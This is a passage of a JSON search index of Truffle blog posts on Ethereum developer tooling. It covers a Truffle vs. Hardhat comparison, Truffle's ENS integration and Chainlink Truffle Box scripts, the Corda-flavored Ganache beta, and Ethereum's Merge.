three main components for dapp development: Hardhat , the development environment, Hardhat Runner , the task runner, and Hardhat Network , the EVM development network. The key value proposition of Hardhat was that it was less opinionated than Truffle, although in recent times, we\u2019re beginning to see Hardhat become more opinionated, which makes sense considering the exponential growth of the Ethereum ecosystem in recent years.", "title": "A bit of history"}, {"location": "blog/truffle-vs-hardhat-breaking-down-the-difference-between-ethereums-top-development-environments/#truffle-vs-hardhat-an-overview-of-each-tool", "text": "", "title": "Truffle vs. Hardhat - An overview of each tool"}, {"location": "blog/truffle-vs-hardhat-breaking-down-the-difference-between-ethereums-top-development-environments/#hardhat-and-truffles-built-in-ethersjs-support", "text": "It is recognized in the ecosystem that Ethers.js has been gaining significant traction in the last few years. This is in big part due to its active maintenance and feature release cadence. That said, Web3.js 4.x recently hit alpha so the library wars are far from over. Hardhat works well with Ethers.js, as an entire plugin and documentation section is dedicated to it. On the other hand, Truffle has built-in contract abstractions that make web3.js easier to use, and has Ethers.js support improvements in the works. It is important to note that despite Truffle and Hardhat having better support for web3.js and Ethers.js respectively, you can still use any of the two, depending on what you\u2019re more comfortable with.", "title": "Hardhat and Truffle\u2019s built-in Ethers.js support"}, {"location": "blog/truffle-vs-hardhat-breaking-down-the-difference-between-ethereums-top-development-environments/#hardhat-and-truffles-built-in-typescript-support", "text": "Hardhat has built-in support for TypeScript and this is important for teams that rely heavily on this programming language as Hardhat requires minimal configuration to get started using TypeScript. You won't need to download any other dependencies if you download the hardhat-toolbox package using NPM 7 or greater. You can simply configure your project using hardhat.config.ts and a tsconfig.json file, and you\u2019re ready to start building! Hardhat also supports writing scripts and smart contract tests in TypeScript. It requires no additional dependencies to get this done. You also won\u2019t need to manually run tsc before running your tests. Additionally, It features type-checking using an optional -- typecheck flag. Truffle, on the other hand, also supports writing tests in TypeScript. However, you\u2019ll need to manually install all the necessary dependencies, and manually run the tsc command to compile TypeScript files.", "title": "Hardhat and Truffle\u2019s built-in TypeScript support"}, {"location": "blog/truffle-vs-hardhat-breaking-down-the-difference-between-ethereums-top-development-environments/#truffle-for-vs-code-extension-vs-hardhat-for-vs-code-extension", "text": "These two extensions vary significantly in what they accomplish. The Truffle for VS Code Extension , which Microsoft originally started, is more catered toward developer user experience. It has an interface for managing your development workflows and representing important information visually. The Truffle for VS code extension also has built-in support for a growing number of Web3 tools and services, including Infura , Truffle debugger , and Ganache . This means that with a few clicks, you can test, debug, and deploy your contracts directly to the Ethereum mainnet and testnets. You can also deploy directly to Ganache and Hyperledger Besu using this extension. The Hardhat for VS code Extension caters more towards providing language support for Solidity. It offers code completion, Solidity code error detection, code formatting, and code actions. It is similar to the Solidity extension by Juan Blanco, although the latter has been around since 2015 and offers additional features such as code snippets and Nethereum code generation for integration with .NET projects.", "title": "Truffle for VS Code Extension vs. Hardhat for VS Code Extension"}, {"location": "blog/truffle-vs-hardhat-breaking-down-the-difference-between-ethereums-top-development-environments/#ganache-vs-hardhat-network", "text": "Both Ganache and Hardhat Network have rich lists of features. They are both local Ethereum network nodes capable of instantly mining new blocks. This makes them very fast and useful for testing smart contracts. They can also be configured to mine blocks at intervals. They are both capable of running as an in-process or standalone daemon. But Ganache takes it a step further by having a standalone graphical user interface called the Ganache GUI that can be used together with other development environments for a more visual experience. Both local networks are capable of forking the Ethereum mainnet and testnets, allowing users to replay real-life transactions locally. This is particularly useful when used together with the Truffle debugger. For example, here is a demo of using the Ganache mainnet forking feature and the Truffle debugger to exploit the DAO hack of 2016. Both have native support for logging items to the console using the console.log statement. Hardhat has had this feature for a while, but Truffle recently incorporated it into Ganache. It is available for use today. Truffle also understands and supports Hardhat\u2019s console.log library contract and Vyper\u2019s print statement, more on that here .", "title": "Ganache vs. Hardhat Network"}, {"location": "blog/truffle-vs-hardhat-breaking-down-the-difference-between-ethereums-top-development-environments/#truffles-built-in-debugging-support", "text": "This is one area that Truffle differs from Hardhat: Truffle not only supports console logging, which many developers use for debugging, but it also features a fully-fledged, integrated debugger with step-in/out, breakpoints e.t.c that is compatible with VS Code. You can also use the Truffle debugger inside test files to debug specific operations. The debugger allows this by exposing the truffle test -- debug command, alongside a debug() function that can be used to wrap contract operations for debugging purposes. More on that here . Truffle debugger exposes another command, truffle debug --fetch-external , that allows developers to debug third-party contracts that are verified on Etherscan and Sourcify . Furthermore, you can debug transactions without creating a Truffle project, using the truffle debug --URL <provider_url> command. You can learn more about the Truffle debugger and how to take advantage of its rich features by checking out its documentation .", "title": "Truffle\u2019s built-in debugging support"}, {"location": "blog/truffle-vs-hardhat-breaking-down-the-difference-between-ethereums-top-development-environments/#truffle-dashboard", "text": "Another area that Truffle differs from Hardhat is in contract deployment security. Usually, smart contract developers will have to copy out their wallet\u2019s private keys or mnemonic and hand them over to JavaScript files or store them in environment config files like .env to be able to deploy their smart contracts. With Truffle Dashboard , you won\u2019t ever expose your private keys or even know what they look like. You can securely deploy contracts to any network of your choice by starting a dashboard instance, which can seamlessly connect to your MetaMask wallet without any configuration, allowing you to use the currently selected account on MetaMask as your Truffle deployment configuration. This isn\u2019t only limited to Truffle users, as the Truffle dashboard also integrates nicely with other developer tools like Hardhat, Foundry, and Tenderly. All you need to do is to download Truffle and follow the instructions on the documentation .", "title": "Truffle Dashboard"}, {"location": "blog/truffle-vs-hardhat-breaking-down-the-difference-between-ethereums-top-development-environments/#integration-with-infura", "text": "The next step after creating and testing smart contracts using either of these tools is to deploy your contracts to either the Mainnet or a testnet so that they can be publicly available. There are several options, but Infura stands out as the most reliable. Also, Infura recently announced its plan to launch a new decentralized infrastructure ecosystem to provide builders with even more options for node service providers. Although Infura is being used today by developers irrespective of what development environment they use, the Truffle for VS Code extension enhances the user experience for Truffle users by only requiring them to link their Infura account one time and subsequently perform all operations without ever needing to leave the VS Code application. More on that in this explainer blog .", "title": "Integration with Infura"}, {"location": "blog/truffle-vs-hardhat-breaking-down-the-difference-between-ethereums-top-development-environments/#multiple-supported-testing-languagestechniques", "text": "In Hardhat, automated tests are primarily written in JavaScript and TypeScript, mainly using Ethers.js and Mocha. Hardhat also exposes custom Chai Matchers and Hardhat Network Helpers libraries through the Hardhat/toolbox plugins to help simplify test code. Truffle, in addition to supporting both JavaScript and TypeScript for writing automated tests that interact with your contract from the outside, more like how a frontend application would, also offers an entirely different method of writing test code, using the Solidity programming language. This technique is used to interact with contracts in advanced, bare-to-the-metal scenarios. You can learn more about testing with Solidity in Truffle in this documentation .", "title": "Multiple supported testing languages/techniques"}, {"location": "blog/truffle-vs-hardhat-breaking-down-the-difference-between-ethereums-top-development-environments/#plugin-support", "text": "Hardhat plugins are bits of reusable configuration code written and exported for wider use. Their primary function is to extend the Hardhat Runtime environment by defining tasks and overriding existing ones. Some examples of things you can achieve with a plugin include: running a linter, using different compiler versions for different files, or generating a UML diagram for your contracts. There is a rich ecosystem of Hardhat plugins that caters to various needs. You can learn more about them on their website . Truffle also offers plugin support although this is still in its early stages. Truffle boxes on the other hand are a bit different in the sense that they do not only provide reusable configuration files for quickly starting a new dapp project, but they also provide all the necessary boilerplate code needed to code, compile and deploy contracts, all while being as less opinionated as possible. The Truffle website has several boxes you can use depending on the type of dapp project you intend to build. There are boxes tailored for developers looking to build on layer 2 networks such as Optimism and Arbitrum . There are boxes to help you start an Optimism bridge project, as well as a React box with all the necessary components for building a functional dapp frontend using modern React and JavaScript code. The most recent addition to the list of available Truffle boxes is the Infura NFT SDK Truffle box that leverages the recently announced Infura NFT API/SDK to make NFT creation a breeze. You can learn more about this box on this explainer blog .", "title": "Plugin support"}, {"location": "blog/truffle-vs-hardhat-breaking-down-the-difference-between-ethereums-top-development-environments/#choosing-the-right-dapp-development-environment", "text": "At the end of the day, choosing the right development environment largely depends on your unique needs and those of the dapps you\u2019re looking to create. At Truffle, our mantra is about collaboration and improving interoperability, so if you choose to use Hardhat, plus Truffle\u2019s debugger, dashboard, and Ganache they work well together. We're also building compatibility for Foundry, although you'll get the latest Truffle features and a more integrated experience if you decide to use Truffle from the ground up. At Truffle, we remain committed to improving and simplifying the user experience for dapp developers in the Web3 ecosystem by creating developer tools, resources, and educational materials. To find out more about our suite of developer tools, visit the official Truffle website . If you have questions, feel free to start a discussion on our Github Discussions page . We also hold weekly live-streamed sessions called Web Unleashed , where we build, interview folks, and discuss important developments around the ecosystem. Keep an eye on our Twitter for updates on the next session. You can also find past episodes on the Truffle Youtube channel and the unleashed section of our website if you prefer written materials.", "title": "Choosing the right dapp development environment"}, {"location": "blog/try-new-features-first-with-truffle-teams-early-access/", "text": "Truffle Teams is constantly evolving. Between adding new features, polishing, and refining the app there's so much we'd love to share with the world in a faster way. Wouldn't it be nice to take those new enhancements and features for a test drive? Now you can with early access! Enable early access with just one click! ## How Early Access Works To join early access, select the Early Access option in the Advanced tab via the account Settings Page. This account will now have access to new features and enhancements we're cooking up. First up is a hotly anticipated feature--the debugger, [which you can learn more about here](/blog/debug-quickly-and-in-context-with-truffle-teams-new-debugger). We'll provide a helpful reminder as to where you can provide feedback and request support. Your feedback is one of the most important parts of this process, and we're excited to hear from you in the earlier phases of development! Want to switch back to the stable track? You can disable Early Access at any time, but anything that requires data storage will be erased. We hope you enjoy getting a taste of what's to come! CHECK OUT TRUFFLE TEAMS EARLY ACCESS ## Continue the Conversation We want Truffle Teams to be the most effective DevOps tool in the blockchain space for both new and existing teams. Let us know what you think about the new deployment views, or if your team has other needs we haven't met yet. Continue the conversation with your fellow Trufflers in our Slack community! SIGN UP FOR THE TRUFFLER SLACK Thanks! _Josh Quintal, Head of Product & Marketing_", "title": "Try New Features First with Truffle Teams Early Access"}, {"location": "blog/unwrap-the-corda-flavored-ganache-beta/", "text": "Important The Corda flavor is deprecated and has been removed from Ganache UI in v2.7.0. See the release notes for details. Earlier this year at TruffleCon we announced our partnership with Corda to develop a Corda Flavored Ganache . Then, at CordaCon in London we shared more details around the integration . Today, we are proud to share with you the beta release is live ! As a quick refresher: Ganache is Truffle's \"one click blockchain\" that allows you to run a test network for local development. You don't need an internet connection and because it's all on the same machine, Ganache allows users to see the status of the network in greater detail than on a live network. The workspace selection screen--now with Corda! We're thrilled to release Ganache for the Corda Blockchain, as this lowers the barrier of entry for Corda developers by allowing them to easily set up a local network on their machines, giving introspection into the state of that network across various nodes and visibility to transactions normally hidden by a live Corda network's privacy protections. With the Beta version, Corda Flavored Ganache brings you: One-click Corda network configuration and initialization, so you can focus on what matters most: your application. Easy access to all your application's data, including network map, notaries, nodes, transactions, and states. Multiple workspaces for all of your Corda projects; workspaces contain configurations of a Corda network map, notaries, nodes, transactions, accounts, and ledgers. As always, Truffle's tools come standard on Windows, macOS, and Linux. We are excited to share this with the Corda community and we also need to your help! Since this is a Beta release, we know it's not perfect. If you find a bug, do us a favor and file an issue here . \u2709\ufe0f Sign up for the Corda Flavored Ganache mailing list here to get the latest updates on all things Ganache + Corda. If you don't hear from us immediately, know that our team is taking some much needed time off starting today. We'll be back January 6th, 2020 ready to dive into your feedback! If you see them around the net, make sure to give a HUGE thank you to David Murdoch and Nick Paterno . Their hard work made this all possible and we're a very fortunate organization to have them aboard! \ud83d\udc96 Try the Corda Flavored Ganache beta and let us know what you think! Download Corda Flavored Ganache", "title": "Unwrap the Corda Flavored Ganache Beta"}, {"location": "blog/upcoming-improvements-to-encoding-and-decoding/", "text": "When you\u2019re writing, running, or debugging your smart contract, you don\u2019t want to have to deal with raw binary data. Truffle\u2013\u2013and Ganache and Drizzle\u2013\u2013already contain a number of encoding and decoding features to help you interact with your contract and understand what you\u2019re seeing. But luckily, encoding and decoding are about to become even more robust, informative, and usable. Not all of these features will be immediately available in Truffle 5.1, but some will, so let\u2019s start with one that will be ready! Allow me to illustrate: Yes, debugging displays are about to become quite a bit more colorful! And though it\u2019s not related to decoding, yes that is syntax highlighting in the debugger! Of course, it\u2019s not just a matter of color. Previously, many data types displayed inappropriately as strings, and enums displayed as objects. Now, each data type will be displayed in a form (and color) that makes sense, making them recognizable at a glance. No longer will a function be confused for a string! Of course, this wouldn\u2019t be possible without our new, more machine-readable, decoder output format. This one\u2019s a little technical, and it\u2019s not something you\u2019re likely to find yourself dealing with directly -- you probably aren\u2019t using Truffle Decoder directly. But Ganache and Drizzle both make use of it, and as they update to incorporate the new format, you\u2019ll be able to get a better view of the state of your contracts with them. But that\u2019s not all; we\u2019re also intending to eventually integrate these encoding and decoding features into Truffle Contract. This will allow you to send transactions and decode events that you currently can\u2019t! For instance, Vyper contracts support decimal fractions as a datatype, but our current encoder and decoder, and the ethers library, do not support these. If you want to send a transaction (or if your contract emits an event) that takes a decimal fraction as input, you are going to run into trouble. With our upcoming encoding and decoding improvements, this should no longer be a problem. (Or, for something of more concern to our Solidity users, the same applies to external function pointers.) Finally, I\u2019d like to discuss decoding of events. Currently, when you check what events your contract may have emitted recently, you may have trouble decoding events emitted by libraries. Our new decoder, though, will be able to handle these just fine. It will even handle anonymous events! That may seem impossible, but hey, that hasn\u2019t deterred us. We\u2019re hoping Truffle\u2019s new encoder and decoder will make staring at raw binary data a thing of the past! Unless you like to, of course. But for those of you who\u2019d prefer to take a higher-level view and deal directly with what that binary data actually means\u2026 well, that\u2019s what Truffle\u2019s for, isn\u2019t it?", "title": "Upcoming improvements to encoding and decoding"}, {"location": "blog/using-the-ens-integration/", "text": "By Tyler Feickert, Blockchain Tools Engineer at Truffle Among the new features released with Truffle 5.1 is support for Ethereum Name Service (ENS) name resolution and setting the resolver address for owned names! ENS is a system that allows for the resolution of Ethereum addresses using human-readable names. Like DNS, ENS aims to simplify working with addresses and allowing us to work with names like \"truffle.eth\" in place of things that cumbersomely resemble something like \"0x1234567890123456789012345678901234567890\" . Are you sure you copied that address correctly? Ready to send your Ether there? In ENS, a contract called a registry is deployed to a network. The ENS team has deployed a registry contract to Mainnet and several test networks. These are the registries that Truffle connects to by default if no registry address is set in the Truffle config. An ENS registry contract contains a list of names and who owns them. Each name also points to a resolver contract if one is set. Addresses own ENS names and have the ability to set the resolver that a given name points to. The resolver is the contract responsible for returning an address for resolution. The idea is that the owner will have the ability to set the resolver contract to return the desired address. For more detailed information on ENS, check out the ENS website . So we at Truffle think this project is pretty awesome and, as mentioned above, built an integration with it. Previously in your migrations, for example, you needed to manually deal with addresses. So maybe you wanted to send some tokens from your contract to another address. In your Truffle migration you might have the following code: await myTokenContract . sendTokens ( 999 , \"0x1234567890123456789012345678901234567890\" , { from : \"0x0987654321098765432109876543210987654321\" } ); It is difficult and tiring to deal with raw addresses like this. Now in Truffle, if you turn on the ENS name resolution and you have a resolver set to your address of choice, you can do something like the following in place of the above: await myTokenContract . sendTokens ( 999 , \"truffle.eth\" , { from : \"my.account\" } ); Well, that seems much easier to read. Under the hood during the migrations, Truffle will connect to the on-chain registry and automatically resolve the addresses for both \"truffle.eth\" and \"my.account\". You now can use valid ENS names in place of addresses in your migrations! In other words, any place that an address is expected for an argument to a function call, you can instead provide the ENS name. One other big piece of functionality for this ENS integration is the ability to set the resolution address for owned ENS addresses. You can do this using deployer.ens.setAddress in your migrations. Suppose I control an address that owns the name \"arnold.hagenchop.eth\" and I want to set the address to \"0x1234123412123412341212341234121234123412\". In this case I would write something like the following in my migration: const myAddress = \"0x1234123412123412341212341234121234123412\" ; await deployer . ens . setAddress ( \"arnold.hagenchop.eth\" , myAddress , { from : \"0x8888888888888888888888888888888888888888\" } ) Now let's take a step back and look at what we did. So you can see that the setAddress method has three arguments. The first one is the name that we'd like to set the resolver for. As stated above we want to set the resolver address for \"arnold.hagenchop.eth\". The second argument is the address to set for the given name's ENS resolution. The last one is an object that resembles a transaction parameter object. The important thing about this object is that it must have a from property with the address that controls the name given as the first argument. This is important or the transaction will fail! You can find some more information about registering ENS names from the ENS website . One other useful convenience with this method is that you can also provide a Truffle contract object that has a deployed address as the second argument if you'd like. So the above code might look like the following instead: const MyContract = artifacts . require ( \"MyContract\" ); const myContract = await MyContract . deployed (); await deployer . ens . setAddress ( \"arnold.hagenchop.eth\" , myContract , { from : \"0x8888888888888888888888888888888888888888\" } ) In that case, \"arnold.hagenchop.eth\" will be set to the address at which myContract is deployed! This new integration should just be the start of a much more robust system that allows Truffle projects to interact with ENS! In the future, we also hope to add other features such as reverse resolution (resolving a name from an address) and automatic name registration where possible. We think this will be a big step forward in making the Ethereum ecosystem more accessible as well as convenient to work with! For more thorough information about this integration, see the Truffle docs . We have also created an example Truffle box that has some examples of using this new ENS integration alongside other new Truffle v5.1 features. We hope you find this feature as useful as we think it is! Happy Truffling!", "title": "Using Truffle's ENS Integration"}, {"location": "blog/using-truffle-to-interact-with-chainlink-smart-contracts/", "text": "Chainlink is one of the leading blockchain projects building the very first decentralized oracle network that provides external data to smart contracts. Truffle helps smart contract developers by providing a powerful framework to create, test, and deploy smart contracts. In Chainlink\u2019s blog post , their Chainlink Truffle Box has gotten some significant upgrades! If you were fortunate enough to attend Trufflecon 2019, then you have already seen these improvements in action, thanks to Chainlink\u2019s presentation by Thomas Hodges. To start developing your very own Chainlink smart contracts, you can grab Chainlink\u2019s Truffle Box by following the guide here . This article will showcase these brand new additions, starting with Truffle Scripts . Scripts create a much easier approach to interact with our contracts, allowing us to fund a contract with LINK, request data from it, and read the contract\u2019s data with only three commands. To demonstrate this functionality, we will first need to set up our environment variables: MNEMONIC and RPC_URL. Working with blockchain technology requires a wallet, with one of the most popular choices being MetaMask . Within minutes, you can have your very own Ethereum wallet that allows you to easily interact with various dApps. During account generation, you will be shown your secret 12-word seed phrase, known as your mnemonic. (Do not share this with anyone; if someone knows your mnemonic they WILL have access to your addresses and private keys). Be sure to store this mnemonic somewhere safe, as you will need it later to work with our example. Furthermore, you will also need to fund your MetaMask wallet with test LINK and test ETH , in order to power transactions on the Ropsten Ethereum Testnet. Note: When funding your account from a test faucet, make sure you switch from the default Main Ethereum Network to the Ropsten Test Network, to properly see your funds. You can follow any transactions made on the Ropsten Testnet via Etherscan. Our second environment variable will require an RPC URL. Some popular RPC connectivity services include Infura , LinkPool , and Fiews . After establishing a valid RPC connection and the funded address, you can start deploying smart contracts to public networks. _Shown above are the environment variables needed to link your MetaMask wallet to Truffle, found in truffle-config.js._ Once you have all the data you need, you can set your environment variables via the terminal commands: export RPC_URL = your_url_here export MNEMONIC = \u2019your 12 words here\u2019 Migration \u00b6 We are now ready to deploy our smart contract on a public network. To begin, run the command: npm run migrate:live This will compile all of your smart contracts, and then start deploying (migrating) them. Note: you may encounter some compilation warnings with the Chainlink contracts. This is simply because the LINK token was originally deployed with an older version of Solidity. Given that this contract is only being deployed when you run tests, these can be ignored. _Console output of one of our contracts deploying. This particular transaction can be found [here](https://ropsten.etherscan.io/tx/0x4c8125f0e074ce3f65b08f67f9685a0d00c2985c6ebd372507016d78c344d25b)._ Deploying our Migrations and MyContract cost us Ethereum, hence why we needed the faucet from earlier. Now that our contract is deployed, we can utilize the three helper scripts to fund MyContract with LINK (which we got from the Chainlink faucet), create requests, and read the state. There are 3 helper scripts provided to interact with our contract, located in the scripts directory: fund-contract.js request-data.js read-contract.js They can be used by calling them from npx truffle exec . First, we must fund our contract with LINK, which can be done by running the following command: npx truffle exec scripts/fund-contract.js --network live Following deployment, the output displays our contract address as well as the transaction address. We can also look this up on the ropsten explorer . Notice that upon completion, a payment of 1 LINK was sent during the transaction, clearly indicating that our contract has properly been funded. Next, we can now request data from the contract by running: npx truffle exec scripts/request-data.js --network live _In the Chainlink explorer for the network that you made the request (in our example we use Ropsten, but it would work similarly for Rinkeby, Kovan, and Mainnet). As you can see the Chainlink node that we were requesting data from picked up our request and waited for 3 block confirmations before executing the job. We are now ready to read the contract\u2019s state with the written answer from the Chainlink node, indicated by the fulfillment transaction (highlighted in red)._ And finally, for reading the data we run our read-contract script. In particular, this will run faster because we\u2019re not creating a transaction, we are simply reading the current state of the smart contract. npx truffle exec scripts/read-contract.js --network live Notice for our output when reading the data, we get a number displaying the current price of LINK in USD * 100 (as of writing, 22094). This is due to the value of times specified in our smart contract request-data.js. _Request-data.js. TRUFFLE_CL_BOX_TIMES is an environment variable which is used to override the default value of 100. This value is used for the precision of the endpoint\u2019s response (in this case, for the price of ETH in USD), and also because Solidity cannot handle decimals. Any of these values can be changed for your project._ Thanks to the power of Truffle, it has never been easier to work with smart contract development. We hope you enjoyed working with our Chainlink Truffle Box, allowing you to fully test, deploy, and interact with contracts on the network. Thanks for reading, and stay tuned for future updates at https://blog.chain.link/ .", "title": "Using Truffle to interact with Chainlink Smart Contracts"}, {"location": "blog/using-truffle-to-interact-with-chainlink-smart-contracts/#migration", "text": "We are now ready to deploy our smart contract on a public network. To begin, run the command: npm run migrate:live This will compile all of your smart contracts, and then start deploying (migrating) them. Note: you may encounter some compilation warnings with the Chainlink contracts. This is simply because the LINK token was originally deployed with an older version of Solidity. Given that this contract is only being deployed when you run tests, these can be ignored. _Console output of one of our contracts deploying. This particular transaction can be found [here](https://ropsten.etherscan.io/tx/0x4c8125f0e074ce3f65b08f67f9685a0d00c2985c6ebd372507016d78c344d25b)._ Deploying our Migrations and MyContract cost us Ethereum, hence why we needed the faucet from earlier. Now that our contract is deployed, we can utilize the three helper scripts to fund MyContract with LINK (which we got from the Chainlink faucet), create requests, and read the state. There are 3 helper scripts provided to interact with our contract, located in the scripts directory: fund-contract.js request-data.js read-contract.js They can be used by calling them from npx truffle exec . First, we must fund our contract with LINK, which can be done by running the following command: npx truffle exec scripts/fund-contract.js --network live Following deployment, the output displays our contract address as well as the transaction address. We can also look this up on the ropsten explorer . Notice that upon completion, a payment of 1 LINK was sent during the transaction, clearly indicating that our contract has properly been funded. Next, we can now request data from the contract by running: npx truffle exec scripts/request-data.js --network live _In the Chainlink explorer for the network that you made the request (in our example we use Ropsten, but it would work similarly for Rinkeby, Kovan, and Mainnet). As you can see the Chainlink node that we were requesting data from picked up our request and waited for 3 block confirmations before executing the job. We are now ready to read the contract\u2019s state with the written answer from the Chainlink node, indicated by the fulfillment transaction (highlighted in red)._ And finally, for reading the data we run our read-contract script. In particular, this will run faster because we\u2019re not creating a transaction, we are simply reading the current state of the smart contract. npx truffle exec scripts/read-contract.js --network live Notice for our output when reading the data, we get a number displaying the current price of LINK in USD * 100 (as of writing, 22094). This is due to the value of times specified in our smart contract request-data.js. _Request-data.js. TRUFFLE_CL_BOX_TIMES is an environment variable which is used to override the default value of 100. This value is used for the precision of the endpoint\u2019s response (in this case, for the price of ETH in USD), and also because Solidity cannot handle decimals. Any of these values can be changed for your project._ Thanks to the power of Truffle, it has never been easier to work with smart contract development. We hope you enjoyed working with our Chainlink Truffle Box, allowing you to fully test, deploy, and interact with contracts on the network. Thanks for reading, and stay tuned for future updates at https://blog.chain.link/ .", "title": "Migration"}, {"location": "blog/we-came-we-saw-we-merged-whats-next-for-ethereum-and-the-dapp-developer-experience-at-truffle/", "text": "By Kingsley Arinze On the 15th of September 2022, The Merge - Ethereum\u2019s upgrade from PoW to PoS, was successfully completed. This has led to the complete overhaul of Ethereum\u2019s consensus mechanism, an incredibly great engineering accomplishment not just for the ecosystem, but for the world at large. WIth this upgrade, Ethereum now runs on ~99.98% less electricity than it used to with PoW. To put this into perspective, that\u2019s equivalent to a country like Finland shutting down its entire electricity grid in one night according to the Ethereum energy consumption index . Also, based on the same report, the Merge is projected to reduce world electricity consumption by 0.2%, the decarbonization in the technology sector\u2019s history that paves the way for all industries. This post is the fourth and final part of the Truffle Merge content series, where we discuss the Merge, its importance and how it impacts our suite of tools at Truffle. You can check out part 1, 2, and 3 below: The Merge and what it means for Truffle Preparing for the Merge, hear from our Truffle engineers How the Merge impact the application layer and developer experience Immediate impact of the Merge \u00b6 The most important impact of the Merge is Etheruem\u2019s reduced energy consumption going forward. As stated earlier, Ethereum now requires ~99.98% less energy to run successfully, a huge reduction in its carbon footprint. As pointed out by Justin Drake, a member of the Ethereum core dev group in this interview , the Merge would result to ~0.2% reduction in world electricity consumption and while there\u2019s been some debates about the validity of his statement, as former Ethereum PoW miners are moving to other PoW blockchain to continue mining blocks, the Merge sets an example for how technologies can become less harmful to our immediate environment. Another important impact the Merge will have on Ethereum are the new validators it will onboard over the coming months and years. While PoW Ethereum requires extensive hardware with expensive chips to be a part of the validators network, PoS only requires validators to possess 32 ETH to be able to participate in the network. Although the goal we\u2019re working towards is to ensure Ethereum is fully decentralized and no one organization or individual has a major stake in validating nodes, this isn\u2019t the case yet. Shortly after the Merge, the founder of Gnosis Safe took to Twitter to point out how ~50% of validation of the first 1000 blocks were controlled by two major players in Lido and Coinbase. This is the ongoing debate about client diversity that you can read about more on the ConsenSys blog. Another impact of the Merge is the reduction in the issuance of ETH, mostly due to a burning mechanism that was introduced by EIP-1559 which drastically reduced the amount of new ETH issued with every block. There are speculations that Ethereum would become deflationary, meaning that its token supply could decrease over time. What\u2019s next for Ethereum \u00b6 With the Merge complete, it is important to note that the future envisioned for Ethereum by the core team is still in process as there are other network upgrades coming. Upgrades that promise to make Ethereum more private, scalable, and secure. In his talk during the last EthCC in Paris, Vitalik Buterin, outlined some of these upgrades as follows: The Surge: Improve network scalability by introducing sharding, a technique used by database providers to limit the amount of data being stored at a specific location. The Verge: Decrease node validation times by replacing Merkle trees with Verkle trees. The Purge: Remove excess historical data, thereby reducing the network congestion and space requirement for validators. The Splurge: Other \u201cfun stuff\u201d that would further improve the network. If you\u2019re interested in delving deeper into these future updates in greater detail, my colleagues wrote this amazing blog that does justice to the topic. What\u2019s next for Truffle \u00b6 At Truffle, our goal remains the same - onboard the next generation of dapp developers by improving the developer experience for builders in the Ethereum ecosystem through the creation and maintenance of tools and resources that support all aspects of dapp development. We are excited for the success of the Merge and look forward to other upgrades coming to Ethereum in the coming months. We also remain committed to ensuring that Truffle users are carried along throughout this period, while also ensuring that the upgrades to Ethereum are as seamless as possible for our users. In our previous post , we highlighted some of the changes to the application layer you should be aware of since the Merge. Most notable is the deprecation of two popular testnets within the dapp developer ecosystem: Rinkeby and Ropsten as well the deprecation of the Kiln testnet, which was initially setup for testing the Ethereum network post-merge. The future is truly decentralized and we\u2019re happy to see the impact the Merge is having on tools around the ecosystem. Just last week, following the success of the Merge, Infura , the most reliable node provider in Web3, announced their plan to launch a decentralized infrastructure protocol early next year. This protocol, when launched, will enable diverse infrastructure operators to participate in node provision, thereby eliminating the concerns from the community about a single company being the major source of Ethereum node access. You can learn more about the announcement in this press release . Stay in touch with us \u00b6 To stay up to date with the updates coming to Ethereum and how we are preparing for it at Truffle, subscribe to the Truffle newsletter by visiting our website today. We also hold weekly live streamed sessions called Web Unleashed , where we build, interview folks, and discuss important developments around the ecosystem. Keep an eye on our Twitter for updates on the next session. You can also find past episodes on the Truffle Youtube channel and the unleashed section of our website if you prefer written materials.", "title": "We came, we saw, we Merged! What\u2019s next for Ethereum and the dapp developer experience at Truffle"}, {"location": "blog/we-came-we-saw-we-merged-whats-next-for-ethereum-and-the-dapp-developer-experience-at-truffle/#immediate-impact-of-the-merge", "text": "The most important impact of the Merge is Etheruem\u2019s reduced energy consumption going forward. As stated earlier, Ethereum now requires ~99.98% less energy to run successfully, a huge reduction in its carbon footprint. As pointed out by Justin Drake, a member of the Ethereum core dev group in this interview , the Merge would result to ~0.2% reduction in world electricity consumption and while there\u2019s been some debates about the validity of his statement, as former Ethereum PoW miners are moving to other PoW blockchain to continue mining blocks, the Merge sets an example for how technologies can become less harmful to our immediate environment. Another important impact the Merge will have on Ethereum are the new validators it will onboard over the coming months and years. While PoW Ethereum requires extensive hardware with expensive chips to be a part of the validators network, PoS only requires validators to possess 32 ETH to be able to participate in the network. Although the goal we\u2019re working towards is to ensure Ethereum is fully decentralized and no one organization or individual has a major stake in validating nodes, this isn\u2019t the case yet. Shortly after the Merge, the founder of Gnosis Safe took to Twitter to point out how ~50% of validation of the first 1000 blocks were controlled by two major players in Lido and Coinbase. This is the ongoing debate about client diversity that you can read about more on the ConsenSys blog. Another impact of the Merge is the reduction in the issuance of ETH, mostly due to a burning mechanism that was introduced by EIP-1559 which drastically reduced the amount of new ETH issued with every block. There are speculations that Ethereum would become deflationary, meaning that its token supply could decrease over time.", "title": "Immediate impact of the Merge"}, {"location": "blog/we-came-we-saw-we-merged-whats-next-for-ethereum-and-the-dapp-developer-experience-at-truffle/#whats-next-for-ethereum", "text": "With the Merge complete, it is important to note that the future envisioned for Ethereum by the core team is still in process as there are other network upgrades coming. Upgrades that promise to make Ethereum more private, scalable, and secure. In his talk during the last EthCC in Paris, Vitalik Buterin, outlined some of these upgrades as follows: The Surge: Improve network scalability by introducing sharding, a technique used by database providers to limit the amount of data being stored at a specific location. The Verge: Decrease node validation times by replacing Merkle trees with Verkle trees. The Purge: Remove excess historical data, thereby reducing the network congestion and space requirement for validators. The Splurge: Other \u201cfun stuff\u201d that would further improve the network. If you\u2019re interested in delving deeper into these future updates in greater detail, my colleagues wrote this amazing blog that does justice to the topic.", "title": "What\u2019s next for Ethereum"}, {"location": "blog/we-came-we-saw-we-merged-whats-next-for-ethereum-and-the-dapp-developer-experience-at-truffle/#whats-next-for-truffle", "text": "At Truffle, our goal remains the same - onboard the next generation of dapp developers by improving the developer experience for builders in the Ethereum ecosystem through the creation and maintenance of tools and resources that support all aspects of dapp development. We are excited for the success of the Merge and look forward to other upgrades coming to Ethereum in the coming months. We also remain committed to ensuring that Truffle users are carried along throughout this period, while also ensuring that the upgrades to Ethereum are as seamless as possible for our users. In our previous post , we highlighted some of the changes to the application layer you should be aware of since the Merge. Most notable is the deprecation of two popular testnets within the dapp developer ecosystem: Rinkeby and Ropsten as well the deprecation of the Kiln testnet, which was initially setup for testing the Ethereum network post-merge. The future is truly decentralized and we\u2019re happy to see the impact the Merge is having on tools around the ecosystem. Just last week, following the success of the Merge, Infura , the most reliable node provider in Web3, announced their plan to launch a decentralized infrastructure protocol early next year. This protocol, when launched, will enable diverse infrastructure operators to participate in node provision, thereby eliminating the concerns from the community 